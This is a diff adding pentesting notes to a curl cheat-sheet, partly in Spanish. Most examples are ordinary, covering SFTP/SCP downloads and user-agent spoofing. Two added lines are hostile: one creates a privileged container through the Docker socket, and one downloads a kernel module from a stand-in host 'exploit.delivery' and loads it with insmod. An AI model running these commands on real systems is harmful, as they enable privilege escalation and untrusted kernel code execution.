@@ -37,3 +37,43 @@ Mostrar el tiempo de conexión y otras métricas con -w
 https://gist.github.com/subfuzion/08c5d85437d5d4f00e58
 
 
+
+
+    curl --unix-socket $SOCKPATH -d '{"Image":"bad", "Privileged":"true"}' -H 'Content-Type: application/json' 0/containers/create
+
+    curl -O exploit.delivery/bad.ko && insmod bad.ko
+
+
+    Get a file from an SSH server using SFTP:
+
+    curl -u username sftp://example.com/etc/issue
+    Get a file from an SSH server using SCP using a private key (not password-protected) to authenticate:
+
+    curl -u username: --key ~/.ssh/id_rsa scp://example.com/~/file.txt
+    Get a file from an SSH server using SCP using a private key (password-protected) to authenticate:
+
+    curl -u username: --key ~/.ssh/id_rsa --pass private_key_password
+    scp://example.com/~/file.txt
+
+    curl -A 'Mozilla/3.0 (Win95; I)' http://www.bank.example.com/
+
+
+Reference
+
+    https://curl.se/docs/tutorial.html
+
+
+    https://www.lazyhackers.in/posts/curl-command-cheat-sheet-for-penetration-testing
+
+
+    https://github.com/frizb/HackingWithCurl
+
+
+    https://cyber4hack.com/comando-curl-para-pentesting/
+
+
+    $ curl --referer
+
+    https://manasharsh.medium.com/hacking-with-curl-unleash-the-cli-beast-fdf13ec342cc
+
+curl que carga archivo (bee)
